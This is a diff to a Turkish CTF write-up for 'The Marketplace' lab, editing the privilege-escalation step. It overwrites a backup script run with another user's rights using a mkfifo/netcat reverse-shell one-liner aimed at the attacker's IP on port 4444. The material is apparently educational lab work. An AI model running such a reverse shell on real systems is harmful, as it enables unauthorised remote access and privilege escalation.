@@ -252,12 +252,15 @@ Michael yetkileriyle çalışan bir .sh dosyası var. Eğer bu dosyayı sömüre
 
 ![backup](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/backup_ls.png)
 
+Reverse-Shell alabilmek için shell.sh dosyasını manupile ediyoruz.
+
 ```
 cat > /opt/backups/shell.sh << EOF
-#!/bin/bash      //Yazdığımız kodun bash script formatında olduğunu belirtiyoruz.
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc (kendi ip adresini yaz) 4444 >/tmp/f  //Reverse shell almak için gereken kod.
-EOF      //yazma modunu kapatıyoruz.
+#!/bin/bash     
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc (kendi ip adresini yaz) 4444 >/tmp/f 
+EOF      
 ```
+Bu komut sayesinde cihazımıza shell gönderilecek.
 
 ```
 jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh     //yazdığımız shell.sh dosyasına okuma+yazma+değiştirme yetkisini veriyoruz.
